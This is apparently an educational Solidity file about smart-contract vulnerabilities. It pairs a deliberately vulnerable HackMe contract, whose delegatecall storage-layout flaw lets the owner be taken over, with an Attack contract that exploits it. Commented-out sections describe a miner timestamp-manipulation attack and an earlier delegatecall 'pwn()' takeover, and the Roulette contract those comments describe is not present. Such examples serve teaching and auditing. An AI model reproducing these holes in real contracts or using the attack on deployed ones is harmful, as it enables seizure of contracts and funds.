pragma solidity ^0.5.16;

/*
Roulette is a game where you can win all of the Ether in the contract
if you can submit a transaction at a specific timing.
A player needs to send 10 Ether and wins if the block.timestamp % 15 == 0.
*/

/*
1. Deploy Roulette with 10 Ether
2. Eve runs a powerful miner that can manipulate the block timestamp.
3. Eve sets the block.timestamp to a number in the future that is divisible by 15
   and finds the target block hash.
4. Eve's block is successfully included into the chain, Eve wins the Roulette game.
*/

/*
contract Delegate {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Delegate delegate;

    constructor(Delegate _delegate) public {
        owner = msg.sender;
        delegate = Delegate(_delegate);
    }

    function () external payable {
        address(delegate).delegatecall(msg.data);
    }
}


contract FuncSignature {
    function getPwnSig() public pure returns (bytes memory) {
        return abi.encodeWithSignature("pwn()");
    }
}
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) public {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint public someNumber;

    function addressToUint(address _addr) public pure returns (uint) {
        return uint(_addr);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}









